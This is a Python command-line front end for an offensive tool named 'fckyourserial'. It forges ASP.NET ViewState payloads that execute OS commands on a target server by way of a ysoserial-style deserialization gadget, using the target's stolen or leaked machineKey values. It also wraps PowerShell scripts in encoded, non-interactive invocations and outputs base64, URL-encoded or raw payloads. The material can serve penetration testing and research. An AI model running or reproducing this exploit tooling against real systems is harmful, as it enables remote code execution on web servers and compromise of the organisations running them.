"""
cli.py — Argument parsing and output handling for fckyourserial.
"""

from __future__ import annotations

import argparse
import base64
import sys
from typing import List, Optional
from urllib.parse import quote

from .gadgets import generate_viewstate


def _parse_hex(s: str) -> bytes:
    s = s.strip().replace(" ", "").replace("-", "")
    if len(s) % 2:
        raise argparse.ArgumentTypeError("hex string must have even length")
    try:
        return bytes.fromhex(s)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(str(exc)) from exc


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="fckyourserial",
        description="Forge an ASP.NET ViewState that executes a command "
                    "(ysoserial-style ObjectStateFormatter gadget).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  %(prog)s -vkey <hex> -ekey <hex> \"whoami\"\n"
               "  %(prog)s -vkey <hex> -ekey <hex> -ps \"whoami; hostname\"\n"
               "  %(prog)s -vkey <hex> -ekey <hex> --legacy \"id\"\n"
               "  %(prog)s -vkey <hex> -ekey <hex> -o forged.b64 --urlencode \"calc\"\n",
    )

    cmd_group = ap.add_mutually_exclusive_group(required=True)
    cmd_group.add_argument("command", nargs="?", help="OS command (run via cmd.exe /c)")
    cmd_group.add_argument("-cmd", dest="cmd", metavar="STR", help="Same as positional")
    cmd_group.add_argument(
        "-ps", dest="powershell", metavar="SCRIPT",
        help="PowerShell script → encoded as  powershell -NoP -NonI -enc <b64>",
    )

    ap.add_argument("-vkey", type=_parse_hex, required=True,
                    help="ValidationKey (hex) from the target's machineKey")
    ap.add_argument("-ekey", type=_parse_hex, required=True,
                    help="DecryptionKey (hex) from the target's machineKey")
    ap.add_argument("--purpose", required=True,
                    help="Primary purpose string for SP800-108 derivation "
                         "(e.g. WebForms.HiddenFieldPageStatePersister.ClientState)")
    ap.add_argument("--specific", nargs="*", required=True, metavar="STR",
                    help="Specific purpose strings "
                         "(e.g. 'TemplateSourceDirectory: /' 'Type: System.Web.UI.Page')")
    ap.add_argument("--legacy", action="store_true",
                    help="Skip SP800-108 key derivation (use raw machineKey values)")
    ap.add_argument("-o", "--output", metavar="FILE", help="Write payload to file")
    ap.add_argument("--urlencode", action="store_true", help="Also emit a URL-encoded version")
    ap.add_argument("--raw", action="store_true",
                    help="Emit raw binary (IV||CT||MAC) instead of base64")
    ap.add_argument("-q", "--quiet", action="store_true", help="Suppress informational output")

    return ap


def resolve_command(args: argparse.Namespace) -> Optional[str]:
    if args.powershell is not None:
        encoded = base64.b64encode(args.powershell.encode("utf-16le")).decode("ascii")
        return f"powershell -NoP -NonI -enc {encoded}"
    if args.cmd is not None:
        return args.cmd
    return args.command


def main(argv: Optional[List[str]] = None) -> int:
    args = build_parser().parse_args(argv)

    command = resolve_command(args)
    if not command:
        build_parser().error("a command is required")

    if not args.quiet:
        print(f"[*] command  : {command}", file=sys.stderr)
        print(f"[*] legacy   : {args.legacy}", file=sys.stderr)
        if not args.legacy:
            print(f"[*] purpose  : {args.purpose}", file=sys.stderr)
            print(f"[*] specific : {args.specific}", file=sys.stderr)

    try:
        b64 = generate_viewstate(
            command,
            validation_key=args.vkey,
            decryption_key=args.ekey,
            purpose=args.purpose,
            specific_purposes=args.specific,
            legacy=args.legacy,
        )
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    if args.raw:
        data = base64.b64decode(b64)
        if args.output:
            with open(args.output, "wb") as f:
                f.write(data)
            if not args.quiet:
                print(f"[+] wrote {len(data)} raw bytes -> {args.output}", file=sys.stderr)
        else:
            sys.stdout.buffer.write(data)
        return 0

    if args.output:
        with open(args.output, "w") as f:
            f.write(b64)
        if not args.quiet:
            print(f"[+] wrote base64 ViewState -> {args.output}", file=sys.stderr)
    else:
        print(b64)

    if args.urlencode:
        encoded = quote(b64)
        if args.output:
            print(encoded, file=sys.stderr)
        else:
            print(encoded)

    return 0
